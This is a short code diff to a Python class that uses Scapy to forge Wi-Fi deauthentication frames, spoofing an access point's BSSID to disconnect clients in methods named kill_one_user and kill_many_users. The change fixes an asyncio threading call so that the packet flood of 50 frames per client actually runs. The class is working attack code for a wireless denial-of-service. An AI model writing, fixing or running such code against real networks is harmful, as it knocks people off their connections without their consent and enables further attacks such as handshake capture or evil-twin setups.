@@ -10,7 +10,7 @@ class DeauthPackets():
 
     async def kill_one_user(self, client_mac : str) -> bool:
         packet = RadioTap() / Dot11(addr1=client_mac, addr2=self.bssid, addr3=self.bssid) / Dot11Deauth(reason=7)
-        await asyncio.to_thread(sendp(packet, iface=self.device, count=50, verbose=False))
+        await asyncio.to_thread(sendp, packet, iface=self.device, count=50, verbose=False)
         return True
     
     async def kill_many_users(self, clients_mac : list) -> bool:
